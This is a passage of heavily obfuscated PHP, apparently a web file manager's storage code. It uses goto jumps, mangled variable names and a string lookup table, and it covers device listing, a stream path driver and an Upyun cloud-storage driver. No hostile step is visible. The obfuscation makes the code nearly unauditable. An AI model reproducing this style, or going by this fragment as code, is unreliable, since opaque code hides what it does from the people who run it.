$C´öÈ‰ÉÁ’[$F‘¾é¸Îèğ[445]] = $eĞ¶Ó‚å„; goto bâé½—Û«À; EÆ½íî‘òé: $fÄ›¤¢ßŒ„ = $C´öÈ‰ÉÁ’[$F‘¾é¸Îèğ[29]]; $AßÙ§„à£¼ = isset($A®Ç™¦£Æ[$C´öÈ‰ÉÁ’[$F‘¾é¸Îèğ[1564]]]) ? $A®Ç™¦£Æ[$C´öÈ‰ÉÁ’[$F‘¾é¸Îèğ[1564]]] : !1; $Eóã²öˆ† = strpos($fÄ›¤¢ßŒ„, $F‘¾é¸Îèğ[2139]) === 0 ? LNG($F‘¾é¸Îèğ[2140]) : LNG($F‘¾é¸Îèğ[2135]); goto CíÁğÛ‡²ª; CíÁğÛ‡²ª: $C´öÈ‰ÉÁ’[$F‘¾é¸Îèğ[28]] = isset($AßÙ§„à£¼[$F‘¾é¸Îèğ[28]]) ? $AßÙ§„à£¼[$F‘¾é¸Îèğ[28]] : LNG($F‘¾é¸Îèğ[2135]); $C´öÈ‰ÉÁ’[$F‘¾é¸Îèğ[1998]] = isset($AßÙ§„à£¼[$F‘¾é¸Îèğ[1998]]) ? $AßÙ§„à£¼[$F‘¾é¸Îèğ[1998]] : $F‘¾é¸Îèğ[33]; $C´öÈ‰ÉÁ’[$F‘¾é¸Îèğ[1464]] = isset($cÊõç´¶[$fÄ›¤¢ßŒ„]) ? $cÊõç´¶[$fÄ›¤¢ßŒ„] : $Eóã²öˆ†; goto F±ìÇİË¨¸; F±ìÇİË¨¸: $C´öÈ‰ÉÁ’[$F‘¾é¸Îèğ[1895]] = $AßÙ§„à£¼; $eĞ¶Ó‚å„ = json_decode($C´öÈ‰ÉÁ’[$F‘¾é¸Îèğ[445]], !0); $C´öÈ‰ÉÁ’[$F‘¾é¸Îèğ[2132]] = isset($eĞ¶Ó‚å„[$F‘¾é¸Îèğ[2132]]) ? $eĞ¶Ó‚å„[$F‘¾é¸Îèğ[2132]] : $F‘¾é¸Îèğ[33]; goto E±âÅß’Œº; bÅæéò‡ÃÒ: } $this->clearSystemPathLog($dõÃœ®ñÃ ); goto EÓ¸ÃÛ›‚ƒ; FÚ ÔÓ–¤: $F‘¾é¸Îèğ =& $_SERVER[›é¼±]; $b¨Ä‹¯ù˜• = array_to_keyvalue($CÌ‘ã©¶ÙÌ, $F‘¾é¸Îèğ[33], $F‘¾é¸Îèğ[1564]); $A®Ç™¦£Æ = Model($F‘¾é¸Îèğ[532])->userListInfo(array_unique($b¨Ä‹¯ù˜•)); goto fĞœëíĞ×; EÓ¸ÃÛ›‚ƒ: return $DÌ„£Ö¥’ƒ; goto dòïöÄò¤; fĞœëíĞ×: $cÜ×¦‡ó¡¢ = $this->getSourceList($CÌ‘ã©¶ÙÌ); $cÊõç´¶ = $this->typeAll(); $DÌ„£Ö¥’ƒ = array(); goto eÛõ”¶ÈÍê; dòïöÄò¤: } private function clearSystemPathLog($bì»“°†š’) { $bÓˆ¥ˆ¤¤º =& $_SERVER[›é¼±]; if (count($bì»“°†š’) == 0) { return; } $EáåÜ­Ÿ†‘ = array($bÓˆ¥ˆ¤¤º[395] => array($bÓˆ¥ˆ¤¤º[7], array_unique($bì»“°†š’))); $this->where($EáåÜ­Ÿ†‘)->delete(); } public function deviceList($EøŸÊ‡¼ö¡, $BÖƒÚ‹›—Ë = 0) { $E£Éë­ºÕ =& $_SERVER[›é¼±]; $fÚÈé‡«ë‹ = array($E£Éë­ºÕ[1564] => $EøŸÊ‡¼ö¡, $E£Éë­ºÕ[194] => array($E£Éë­ºÕ[1006], $BÖƒÚ‹›—Ë), $E£Éë­ºÕ[29] => $E£Éë­ºÕ[1673]); $fÓÜŒÜÀğ = array(); $B•‹™ÓŒÜÃ = $this->field($E£Éë­ºÕ[2142])->where($fÚÈé‡«ë‹)->order($E£Éë­ºÕ[1961])->limit(50)->select(); foreach ($B•‹™ÓŒÜÃ as $D­‹çµÔ§ => $FËÓïß¿‹) { goto EŞ«ñÃĞæİ; FÄØ¤ËÊ: $this->ipAddress($FËÓïß¿‹); $FËÓïß¿‹[$E£Éë­ºÕ[445]] = $DŠïŠ­Œ›Ä; $fÓÜŒÜÀğ[$eÆ®œ°µŞ©] = $FËÓïß¿‹; goto d‰Õ“óéí¼; f¤é«ŒÖ¡: unset($DŠïŠ­Œ›Ä[$E£Éë­ºÕ[2132]]); $eÆ®œ°µŞ© = $this->deviceType($DŠïŠ­Œ›Ä[$E£Éë­ºÕ[1952]]); if (isset($fÓÜŒÜÀğ[$eÆ®œ°µŞ©])) { continue; } goto FÄØ¤ËÊ; EŞ«ñÃĞæİ: if ($D­‹çµÔ§ > 0 && abs($FËÓïß¿‹[$E£Éë­ºÕ[194]] - $B•‹™ÓŒÜÃ[$D­‹çµÔ§ - 1][$E£Éë­ºÕ[194]]) < 5) { continue; } $DŠïŠ­Œ›Ä = json_decode($FËÓïß¿‹[$E£Éë­ºÕ[445]], !0); $FËÓïß¿‹[$E£Éë­ºÕ[2132]] = isset($DŠïŠ­Œ›Ä[$E£Éë­ºÕ[2132]]) ? $DŠïŠ­Œ›Ä[$E£Éë­ºÕ[2132]] : $E£Éë­ºÕ[33]; goto f¤é«ŒÖ¡; d‰Õ“óéí¼: } return array_values($fÓÜŒÜÀğ); } public function deviceType($d†ïë÷øÔ¡) { return $d†ïë÷øÔ¡; } } goto B×œ“¬™±; eôğ–ïùùÏ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($Eì¤†¡¥©•, $dÜôÑæê¾Ó = 0) { parent::__construct(); $this->source = $Eì¤†¡¥©•; $this->sourceSize = $dÜôÑæê¾Ó; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($DÀ¿é±ÆçÀ = false) { return $this->sourceSize; } public function getContent($Eò„¬¢Ğù¯ = false) { return $this->fileSubstr($Eò„¬¢Ğù¯, 0, $this->sourceSize); } public function fileSubstr($Cß½·Ø‚Ğ = false, $aéØÔ‰öÁÚ = 0, $aŠ•ŸÏÕœ† = 0) { if (!$aŠ•ŸÏÕœ†) { $aŠ•ŸÏÕœ† = $this->sourceSize; } $f™ÑÈÛ­“ƒ = $this->sourceSize - $aéØÔ‰öÁÚ; if ($aŠ•ŸÏÕœ† >= $f™ÑÈÛ­“ƒ) { $aŠ•ŸÏÕœ† = $f™ÑÈÛ­“ƒ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $aéØÔ‰öÁÚ, $aŠ•ŸÏÕœ†); } if ($this->sourceType == self::TYPE_FILE) { if ($aŠ•ŸÏÕœ† <= 0) { return $_SERVER[›é¼±][33]; } $EÁò¿«‚Ìº = ftell($this->source); fseek_64($this->source, $EÁò¿«‚Ìº + $aéØÔ‰öÁÚ); $bíëÀ‘‚î = @fread($this->source, $aŠ•ŸÏÕœ†); fseek_64($this->source, $EÁò¿«‚Ìº); return $bíëÀ‘‚î; } } public function hashMd5($C°²‹™†ê± = false) { return md5($this->getContent()); } public static function hash($BóĞÂ¢†ë, $aøÛê±ÒÏÎ = 0) { $aª©ªÌÁ“™ = new PathDriverStream($BóĞÂ¢†ë, $aøÛê±ÒÏÎ); return $aª©ªÌÁ“™->hashSimple($BóĞÂ¢†ë); } public static function md5($fØ¼õóó†â, $a²‡™Şø‰ = 0) { $CŒÓ©¼­Ú = new PathDriverStream($fØ¼õóó†â, $a²‡™Şø‰); return $CŒÓ©¼­Ú->hashMd5($fØ¼õóó†â); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\x3a\57\x2f\166\x30\56\141\160\151\56\165\160\171\x75\x6e\56\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($A™Ò¤œøˆõ) { parent::__construct(); $this->_init($A™Ò¤œøˆõ); } public function _init($c„ñÑŒí) { $a‡©´¥ñ =& $_SERVER[›é¼±]; foreach ($c„ñÑŒí as $cˆùÀ˜ğĞš => $DŞ‚Š’°ˆÁ) { if (isset($this->{$cˆùÀ˜ğĞš})) { $this->{$cˆùÀ˜ğĞš} = $DŞ‚Š’°ˆÁ; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($a‡©´¥ñ[1362] . LNG($a‡©´¥ñ[1295])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($f½ÑÇ«Ï¢‚, $EóŒßÉƒó× = "\x47\105\124") { $c™¨š¹ß© =& $_SERVER[›é¼±]; $eè¨¨£ÌßË = gmdate($c™¨š¹ß©[1328]); $a›¾¼äá = base64_encode(hash_hmac($c™¨š¹ß©[1363], "{$EóŒßÉƒó×}\x26{$f½ÑÇ«Ï¢‚}\46{$eè¨¨£ÌßË}", md5("{$this->userpass}"), !0)); $FÁ¨òŒÃ† = array("\101\165\164\150\157\x72\x69\x7a\141\164\151\157\x6e\72\x55\x50\131\125\116\x20{$this->username}\72{$a›¾¼äá}", "\104\141\164\145\72{$eè¨¨£ÌßË}"); return $FÁ¨òŒÃ†; } public function ussRequest($a”‹‰’Í›, $B£ÅÔ²œÁ™ = "\x47\x45\124", $C¯³Ê¸¾´ = false, $d¹Ì¦õ¿„Œ = false, $A¹™Ò§… = false) { goto B ÈŒÅ¿“ğ; B ÈŒÅ¿“ğ: $d¸ƒ©½Ä­Ò =& $_SERVER[›é¼±]; $a”‹‰’Í› = trim($a”‹‰’Í›, $d¸ƒ©½Ä­Ò[8]); $B¶ØÒõâ²Å = "\x2f{$this->bucket}\57{$a”‹‰’Í›}"; goto FÀ–™•†é¾; FÀ–™•†é¾: $Aù´ñ‘šºí = $this->ussHeaders($B¶ØÒõâ²Å, $B£ÅÔ²œÁ™); if ($d¹Ì¦õ¿„Œ) { $Aù´ñ‘šºí = array_merge($Aù´ñ‘šºí, $d¹Ì¦õ¿„Œ); } $DÇÌîõ¿â = url_request($this->endpoint . $B¶ØÒõâ²Å, $B£ÅÔ²œÁ™, $C¯³Ê¸¾´, $Aù´ñ‘šºí, $A¹™Ò§…); goto f°ŒŒá¢Î±; f°ŒŒá¢Î±: if (!$DÇÌîõ¿â) { return array($d¸ƒ©½Ä­Ò[1119] => !1, $d¸ƒ©½Ä­Ò[1121] => $d¸ƒ©½Ä­Ò[1364]); } if (strtolower($B£ÅÔ²œÁ™) == $d¸ƒ©½Ä­Ò[190] || in_array($DÇÌîõ¿â[$d¸ƒ©½Ä­Ò[1119]], array($d¸ƒ©½Ä­Ò[1222], $d¸ƒ©½Ä­Ò[1365]))) { $C¯³Ê¸¾´ = $DÇÌîõ¿â[$d¸ƒ©½Ä­Ò[1366]]; } else { $C¯³Ê¸¾´ = json_decode($DÇÌîõ¿â[$d¸ƒ©½Ä­Ò[1121]], !0); if (!$C¯³Ê¸¾´) { $C¯³Ê¸¾´ = $DÇÌîõ¿â[$d¸ƒ©½Ä­Ò[1121]]; } else { if (!$DÇÌîõ¿â[$d¸ƒ©½Ä­Ò[745]] && isset($C¯³Ê¸¾´[$d¸ƒ©½Ä­Ò[1367]])) { $C¯³Ê¸¾´ = $C¯³Ê¸¾´[$d¸ƒ©½Ä­Ò[1367]]; } } } return array($d¸ƒ©½Ä­Ò[1119] => $DÇÌîõ¿â[$d¸ƒ©½Ä­Ò[745]], $d¸ƒ©½Ä­Ò[1121] => $C¯³Ê¸¾´); goto F‡“ä¾±å‚; F‡“ä¾±å‚: } public function mkfile($eîÑĞòÊ‘À, $c–×Ó¨ÔÊˆ = '', $b¥êÀÅÑ§ = REPEAT_RENAME) { if ($this->setContent($eîÑĞòÊ‘À, $c–×Ó¨ÔÊˆ)) { return $this->getPathOuter($eîÑĞòÊ‘À); } return !1; } public function mkdir($DõÀÆ¨¬œ, $A´ÎŞØ“Œ = REPEAT_SKIP) { $c¦ñ©ñ³îº =& $_SERVER[›é¼±]; $fó¶ØÄŞ˜ = trim($DõÀÆ¨¬œ, $c¦ñ©ñ³îº[8]); if ($this->_isFolder($fó¶ØÄŞ˜)) { return $this->getPathOuter($fó¶ØÄŞ˜); } $DÅ”„ÂŠÒ = array($c¦ñ©ñ³îº[1368]); $D”çµ³Ÿ‚ = $this->ussRequest($fó¶ØÄŞ˜, $c¦ñ©ñ³îº[224], !1, $DÅ”„ÂŠÒ); return $D”çµ³Ÿ‚[$c¦ñ©ñ³îº[1119]] ? $this->getPathOuter($fó¶ØÄŞ˜) : !1; } public function copyFile($b¬ ˜ÖÉÒÛ, $e¤¨ÅĞé) { $eÛŒ„˜Ï•˜ =& $_SERVER[›é¼±]; $b¥²ˆ×ÀÇ¸ = array($eÛŒ„˜Ï•˜[1369] . "\57{$this->bucket}\57{$b¬ ˜ÖÉÒÛ}", $eÛŒ„˜Ï•˜[1370]); $fÄ›æôÍœå = $this->ussRequest($e¤¨ÅĞé, $eÛŒ„˜Ï•˜[226], !1, $b¥²ˆ×ÀÇ¸); return $fÄ›æôÍœå[$eÛŒ„˜Ï•˜[1119]] ? !0 : $this->getPathOuter($e¤¨ÅĞé); } public function moveFile($dğõ¼„ŠØ, $DË±š•Š) { $AÏ”ÒÒ¼¨½ =& $_SERVER[›é¼±]; $DëÁÄÇÒñ = array($AÏ”ÒÒ¼¨½[1371] . "\57{$this->bucket}\x2f{$dğõ¼„ŠØ}", $AÏ”ÒÒ¼¨½[1370]); $bŠ”ìõ”ğ´ = $this->ussRequest($DË±š•Š, $AÏ”ÒÒ¼¨½[226], !1, $DëÁÄÇÒñ); return $bŠ”ìõ”ğ´[$AÏ”ÒÒ¼¨½[1119]] ? !0 : $this->getPathOuter($DË±š•Š); } public function delFile($d‰²Íô—ò) { $C‘µ©÷¹¿¤ =& $_SERVER[›é¼±]; $b¹Ö¹‘¿–† = $this->ussRequest($d‰²Íô—ò, $C‘µ©÷¹¿¤[1372]); return $b¹Ö¹‘¿–†[$C‘µ©÷¹¿¤[1119]] ? !0 : !1; } public function delFolder($c¼äùåî²ƒ) { goto a˜ØÍ¥’î; C§Ì³äµ–Á: return $c‡Š±Ş†«[$bÛŞË«÷ª [1119]]; goto CƒÄñêÁ¯Ø; a˜ØÍ¥’î: $bÛŞË«÷ª  =& $_SERVER[›é¼±]; if (!$this->exist($c¼äùåî²ƒ)) { return !0; } $this->listItemCache = !1; goto E½Ü©²Ëº£; Eï´¥«ĞÙ: foreach ($BÍŸ³…ÉªË as $D¿’Ê…Â™Ë) { $c‡Š±Ş†« = $this->ussRequest($D¿’Ê…Â™Ë[$bÛŞË«÷ª [28]], $bÛŞË«÷ª [1372]); if (!$c‡Š±Ş†«[$bÛŞË«÷ª [1119]]) { return !1; } } foreach ($Bë›½¹ª®¹ as $A¥×ÔÚª) { $c‡Š±Ş†« = $this->ussRequest($A¥×ÔÚª, $bÛŞË«÷ª [1372]); if (!$c‡Š±Ş†«[$bÛŞË«÷ª [1119]]) { return !1; } } $c‡Š±Ş†« = $this->ussRequest($c¼äùåî²ƒ, $bÛŞË«÷ª [1372]); goto C§Ì³äµ–Á; E½Ü©²Ëº£: $Bë›½¹ª®¹ = $BÍŸ³…ÉªË = array(); $this->fileList($c¼äùåî²ƒ, $Bë›½¹ª®¹, $BÍŸ³…ÉªË, !0); $this->listItemCache = !0; goto Eï´¥«ĞÙ; CƒÄñêÁ¯Ø: } public function rename($CÃ´“Õ—¦, $bª ”¼³) { if ($this->isFile($CÃ´“Õ—¦)) { $bª ”¼³ = get_path_father($CÃ´“Õ—¦) . $bª ”¼³; return $this->moveFile($CÃ´“Õ—¦, $bª ”¼³); } return $this->renameObject($CÃ´“Õ—¦, $bª ”¼³); } public function fileInfo($bèéïñÁ¶², $EÃÀÊé†ñ­ = false, $Dø‘‚Øøğ = array()) { goto d›’…”£ù´; a£˜£ä¥ëè: $DÆÑá–Ô¸[$BºÖôï“»Ï[194]] = intval($Dø‘‚Øøğ[$BºÖôï“»Ï[1373]]); $DÆÑá–Ô¸[$BºÖôï“»Ï[84]] = intval($Dø‘‚Øøğ[$BºÖôï“»Ï[1374]]); $DÆÑá–Ô¸[$BºÖôï“»Ï[78]] = $Dø‘‚Øøğ[$BºÖôï“»Ï[78]]; goto aÍ¤ÕÅ½å²; d›’…”£ù´: $BºÖôï“»Ï =& $_SERVER[›é¼±]; $DÆÑá–Ô¸ = array($BºÖôï“»Ï[28] => $this->pathThis($bèéïñÁ¶²), $BºÖôï“»Ï[76] => $this->getPathOuter($BºÖôï“»Ï[8] . $bèéïñÁ¶²), $BºÖôï“»Ï[29] => $BºÖôï“»Ï[193], $BºÖôï“»Ï[78] => isset($Dø‘‚Øøğ[$BºÖôï“»Ï[78]]) ? $Dø‘‚Øøğ[$BºÖôï“»Ï[78]] : 0, $BºÖôï“»Ï[168] => $this->ext($bèéïñÁ¶²)); if ($EÃÀÊé†ñ­) { return $DÆÑá–Ô¸; } goto aÂëÏÉ©Ùö; aÂëÏÉ©Ùö: $DÆÑá–Ô¸[$BºÖôï“»Ï[194]] = $DÆÑá–Ô¸[$BºÖôï“»Ï[84]] = 0; $DÆÑá–Ô¸[$BºÖôï“»Ï[195]] = $DÆÑá–Ô¸[$BºÖôï“»Ï[196]] = !0; if (empty($Dø‘‚Øøğ)) { $Dø‘‚Øøğ = $this->objectMeta($bèéïñÁ¶²); if (!$Dø‘‚Øøğ) { return $DÆÑá–Ô¸; } } goto a£˜£ä¥ëè; aÍ¤ÕÅ½å²: return $DÆÑá–Ô¸; goto c ‘â„èÀå; c ‘â„èÀå: } public function folderInfo($aÏ¬·™, $F„Ç®Ë»é = false) { goto A´äÊ¢õ°ª; fÕ †ê˜¶: $CôÆ»¥òß[$B¥ôĞÛ®µå[194]] = intval($B¯Æ¼ÚìÒ½[$B¥ôĞÛ®µå[1373]]); $CôÆ»¥òß[$B¥ôĞÛ®µå[84]] = intval($B¯Æ¼ÚìÒ½[$B¥ôĞÛ®µå[1374]]); return $CôÆ»¥òß; goto C­Ğìªíà±; DÄƒ‡Æµ: $CôÆ»¥òß[$B¥ôĞÛ®µå[194]] = $CôÆ»¥òß[$B¥ôĞÛ®µå[84]] = 0; $CôÆ»¥òß[$B¥ôĞÛ®µå[195]] = $CôÆ»¥òß[$B¥ôĞÛ®µå[196]] = !0; if (empty($B¯Æ¼ÚìÒ½)) { $B¯Æ¼ÚìÒ½ = $this->objectMeta($aÏ¬·™); if (!$B¯Æ¼ÚìÒ½) { return $CôÆ»¥òß; } } goto fÕ †ê˜¶; A´äÊ¢õ°ª: $B¥ôĞÛ®µå =& $_SERVER[›é¼±]; $CôÆ»¥òß = array($B¥ôĞÛ®µå[28] => $this->pathThis($aÏ¬·™), $B¥ôĞÛ®µå[76] => $this->getPathOuter($B¥ôĞÛ®µå[8] . $aÏ¬·™), $B¥ôĞÛ®µå[29] => $B¥ôĞÛ®µå[77]); if ($F„Ç®Ë»é) { return $CôÆ»¥òß; } goto DÄƒ‡Æµ; C­Ğìªíà±: } private function listObjs($a ïÀã, $d¶ÛÇ¿¸¢â = 0, $aŸ„Ò»Û¿ = 1000) { $D»àêˆÙ¾Ç =& $_SERVER[›é¼±]; $AóêÁ”‰íÅ = array($D»àêˆÙ¾Ç[1375], $D»àêˆÙ¾Ç[1376] . $aŸ„Ò»Û¿); if ($d¶ÛÇ¿¸¢â) { $AóêÁ”‰íÅ[] = $D»àêˆÙ¾Ç[1377] . $d¶ÛÇ¿¸¢â; } $aãÊäÒòÖ‘ = $this->ussRequest($a ïÀã, $D»àêˆÙ¾Ç[228], !1, $AóêÁ”‰íÅ); return !$aãÊäÒòÖ‘[$D»àêˆÙ¾Ç[1119]] ? !1 : $aãÊäÒòÖ‘[$D»àêˆÙ¾Ç[1121]]; } private function fileList($dãºÖ¾¹ø·, &$F›Ã¿¿µ–„, &$cÀ‡ÑËšˆ, $CòíØ’†ùñ = false) { goto aŒˆ¿Ï•­ó; aŒˆ¿Ï•­ó: $BÕäÈ¬‚Ä =& $_SERVER[›é¼±]; $cÂÉÁ˜ÎÅÕ = $BÕäÈ¬‚Ä[33]; $DˆÄ¾½Ö¸“ = 1000; goto fÒ¼í¬æ˜Æ; f¥ÙÀğØ¤: if ($EŠÚÕ¨§) { $this->cacheMethod($BÕäÈ¬‚Ä[199], $dãºÖ¾¹ø·, !0); } goto a²Üí‘‰Çƒ; fÒ¼í¬æ˜Æ: $eÓ’ßàĞöÊ = rtrim($dãºÖ¾¹ø·, $BÕäÈ¬‚Ä[8]) . $BÕäÈ¬‚Ä[8]; $EŠÚÕ¨§ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $B«¦‘–¥ƒ = $this->listObjs($dãºÖ¾¹ø·, $cÂÉÁ˜ÎÅÕ, $DˆÄ¾½Ö¸“); if (!$B«¦‘–¥ƒ) { return !1; } $cÂÉÁ˜ÎÅÕ = isset($B«¦‘–¥ƒ[$BÕäÈ¬‚Ä[1378]]) ? $B«¦‘–¥ƒ[$BÕäÈ¬‚Ä[1378]] : $BÕäÈ¬‚Ä[33]; $EÂÊ‰³ = isset($B«¦‘–¥ƒ[$BÕäÈ¬‚Ä[1379]]) ? $B«¦‘–¥ƒ[$BÕäÈ¬‚Ä[1379]] : array(); foreach ($EÂÊ‰³ as $Eø í²¦Ä›) { $fñ“’•˜Ò¨ = $Eø í²¦Ä›[$BÕäÈ¬‚Ä[29]] == $BÕäÈ¬‚Ä[77] ? !0 : !1; $D’éÙ‘©§Ÿ = ltrim($eÓ’ßàĞöÊ . $Eø í²¦Ä›[$BÕäÈ¬‚Ä[28]], $BÕäÈ¬‚Ä[8]) . ($fñ“’•˜Ò¨ ? $BÕäÈ¬‚Ä[8] : $BÕäÈ¬‚Ä[33]); $c»¥•êŸÚ£ = array($BÕäÈ¬‚Ä[28] => $D’éÙ‘©§Ÿ, $BÕäÈ¬‚Ä[29] => $fñ“’•˜Ò¨ ? $BÕäÈ¬‚Ä[77] : $BÕäÈ¬‚Ä[193], $BÕäÈ¬‚Ä[78] => $Eø í²¦Ä›[$BÕäÈ¬‚Ä[335]], $BÕäÈ¬‚Ä[1374] => $Eø í²¦Ä›[$BÕäÈ¬‚Ä[1380]]); if ($EŠÚÕ¨§) { $this->cacheMethod($BÕäÈ¬‚Ä[199], $D’éÙ‘©§Ÿ, $fñ“’•˜Ò¨); $this->cacheMethod($BÕäÈ¬‚Ä[200], $D’éÙ‘©§Ÿ, $c»¥•êŸÚ£); } if ($fñ“’•˜Ò¨) { $F›Ã¿¿µ–„[] = $D’éÙ‘©§Ÿ; if ($CòíØ’†ùñ) { $this->fileList($D’éÙ‘©§Ÿ, $F›Ã¿¿µ–„, $cÀ‡ÑËšˆ, $CòíØ’†ùñ); } continue; } $cÀ‡ÑËšˆ[] = $c»¥•êŸÚ£; } if (count($EÂÊ‰³) < $DˆÄ¾½Ö¸“) { break; } } goto f¥ÙÀğØ¤; a²Üí‘‰Çƒ: } public function listPath($eÅ¡·´ø°, $a¾åÑÙÔ°Ş = false) { $eƒé´éæ =& $_SERVER[›é¼±]; $dê…§å ’è = $eîá§®â = array(); $this->fileList($eÅ¡·´ø°, $dê…§å ’è, $eîá§®â); foreach ($dê…§å ’è as $D–ËÒĞ›Ç´ => $d¼Ûíòš”) { $dê…§å ’è[$D–ËÒĞ›Ç´] = $this->folderInfo($d¼Ûíòš”, $a¾åÑÙÔ°Ş); } foreach ($eîá§®â as $D–ËÒĞ›Ç´ => $d¼Ûíòš”) { $eîá§®â[$D–ËÒĞ›Ç´] = $this->fileInfo($d¼Ûíòš”[$eƒé´éæ[28]], $a¾åÑÙÔ°Ş, $d¼Ûíòš”); } return array($eƒé´éæ[75] => $dê…§å ’è, $eƒé´éæ[74] => $eîá§®â); } public function has($eõ˜ÄÜƒå, $dÑ‚íõ»í• = false, $eËá„ØĞÜ³ = true) { goto C„‹ğ¥†ô; dãÜÎšÈôĞ: $BóÚê êÒŠ = 0; $F—¦¡ñÀê = 0; $bó·Æø»Ğ = rtrim($eõ˜ÄÜƒå, $FÈ—ò›é›[8]) . $FÈ—ò›é›[8]; goto e©›İÒ£Œ; C„‹ğ¥†ô: $FÈ—ò›é› =& $_SERVER[›é¼±]; $A¸Ãß“…é = $FÈ—ò›é›[33]; $F±Š‰÷èÊØ = 500; goto dãÜÎšÈôĞ; e©›İÒ£Œ: while (!0) { check_abort(); $c†Ó½¸ÅÀ = $this->listObjs($eõ˜ÄÜƒå, $A¸Ãß“…é, $F±Š‰÷èÊØ); if (!$c†Ó½¸ÅÀ) { return !1; } $A¸Ãß“…é = isset($c†Ó½¸ÅÀ[$FÈ—ò›é›[1378]]) ? $c†Ó½¸ÅÀ[$FÈ—ò›é›[1378]] : $FÈ—ò›é›[33]; $EšÂ‰‹ù³ = isset($c†Ó½¸ÅÀ[$FÈ—ò›é›[1379]]) ? $c†Ó½¸ÅÀ[$FÈ—ò›é›[1379]] : array(); if (empty($EšÂ‰‹ù³)) { break; } $bÚÇåÈ‰Û© = array_filter($EšÂ‰‹ù³, function ($dÀóÜ«¤¯) { $a Á”í«Û¼ =& $_SERVER[›é¼±]; return $dÀóÜ«¤¯[$a Á”í«Û¼[29]] == $a Á”í«Û¼[77]; }); $f¥Ë·ö¤§ = count($EšÂ‰‹ù³); $bÚÇåÈ‰Û© = count($bÚÇåÈ‰Û©); $d¼˜æ°Ô…‡ = $f¥Ë·ö¤§ - $bÚÇåÈ‰Û©; if ($dÑ‚íõ»í•) { $F—¦¡ñÀê += $bÚÇåÈ‰Û©; $BóÚê êÒŠ += $d¼˜æ°Ô…‡; if ($f¥Ë·ö¤§ < $F±Š‰÷èÊØ) { break; } continue; } if ($eËá„ØĞÜ³) { if ($d¼˜æ°Ô…‡) { return !0; } } else { if ($bÚÇåÈ‰Û©) { return !0; } } if ($f¥Ë·ö¤§ < $F±Š‰÷èÊØ) { break; } } if ($dÑ‚íõ»í•) { return array($FÈ—ò›é›[203] => $BóÚê êÒŠ, $FÈ—ò›é›[204] => $F—¦¡ñÀê); } return !1; goto E„â›èŒœ; E„â›èŒœ: } public function listAll($cì×ªå®º×) { goto B£Îİ†¢àÀ; B£Îİ†¢àÀ: $EŒ—´Îæ• =& $_SERVER[›é¼±]; $a¯ÍÈó¯ç· = $AÄİÃÈœªâ = array(); $this->fileList($cì×ªå®º×, $a¯ÍÈó¯ç·, $AÄİÃÈœªâ, !0); goto E³ªÁÌ¥Íô; E³ªÁÌ¥Íô: $BÃ«…ğ£İ‘ = array(); foreach ($AÄİÃÈœªâ as $B¤îÊİš¨) { $BÃ«…ğ£İ‘[$B¤îÊİš¨[$EŒ—´Îæ•[28]]] = $B¤îÊİš¨[$EŒ—´Îæ•[78]]; } foreach ($a¯ÍÈó¯ç· as $B¤îÊİš¨) { if (is_string($B¤îÊİš¨)) { $BÃ«…ğ£İ‘[$B¤îÊİš¨] = 0; } } goto BÕö°ë‡–í; BÕö°ë‡–í: return $this->listAllFiles($cì×ªå®º×, array_keys($BÃ«…ğ£İ‘), $BÃ«…ğ£İ‘); goto F°ÅÛ”†í; F°ÅÛ”†í: } public function canRead($b¶×õ®¥„©) { return $this->exist($b¶×õ®¥„©) ? !0 : !1; } public function canWrite($aÎğ­âÀ®) { return $this->exist($aÎğ­âÀ®) ? !0 : !1; } public function getContent($A­º»¸äÄ) { return $this->fileSubstr($A­º»¸äÄ, 0, -1); } public function setContent($F¬Š©ÅÇÖÛ, $CŠ•˜ÔºÀ = '') { $f¢Âë…Ã±Ë =& $_SERVER[›é¼±]; if (!$CŠ•˜ÔºÀ) { $FñøÕâà’™ = $this->ussRequest($F¬Š©ÅÇÖÛ, $f¢Âë…Ã±Ë[224]); return $FñøÕâà’™[$f¢Âë…Ã±Ë[1119]]; } $Bä‹—Õ–Ö = $this->tempFile($this->pathThis($F¬Š©ÅÇÖÛ)); file_put_contents($Bä‹—Õ–Ö, $CŠ•˜ÔºÀ); if ($this->upload($F¬Š©ÅÇÖÛ, $Bä‹—Õ–Ö)) { $this->tempFileRemve($Bä‹—Õ–Ö); return !0; } return !1; } public function fileSubstr($fó†Ä¤Ã¼¶, $f«‘Ş¦ÈäÎ, $cÕÈ´Ş©) { $dôˆ÷Ùò¶ä =& $_SERVER[›é¼±]; if (!($B¤ñ¢ƒôòî = $this->link($fó†Ä¤Ã¼¶))) { return !1; } $cÂ±ÍÎêÀ‚ = !1; if ($cÕÈ´Ş© > 0) { $e©Áï§‡Ğ = $f«‘Ş¦ÈäÎ + $cÕÈ´Ş© - 1; $cÂ±ÍÎêÀ‚ = array($dôˆ÷Ùò¶ä[1341] . $f«‘Ş¦ÈäÎ . $dôˆ÷Ùò¶ä[454] . $e©Áï§‡Ğ); } $c×öâ¼È†Ò = url_request($B¤ñ¢ƒôòî, $dôˆ÷Ùò¶ä[228], !1, $cÂ±ÍÎêÀ‚); return $c×öâ¼È†Ò[$dôˆ÷Ùò¶ä[745]] ? $c×öâ¼È†Ò[$dôˆ÷Ùò¶ä[1121]] : !1; } public function upload($dƒ•Ì¯Œ, $F–ŒìÑ¾ª±, $e¶ĞŠÃÂƒ = false, $FĞ£˜ŒÜ»ğ = REPEAT_REPLACE) { goto eóÍ©ÉæïÎ; c·…Ú×£Ìİ: $dŒ¾åßèô§ = $eË“¥áäƒ[$e’ˆ–ÜËä“[1386]]; $EÛÙå‚Š´ = fopen($F–ŒìÑ¾ª±, $e’ˆ–ÜËä“[1292]); if (!$EÛÙå‚Š´) { return !1; } goto D£²¡¾ÍÆ›; cÒµ™µ…¦ã: if (!$c•®èÎ„ï[$e’ˆ–ÜËä“[1119]]) { return !1; } $eË“¥áäƒ = $c•®èÎ„ï[$e’ˆ–ÜËä“[1121]]; 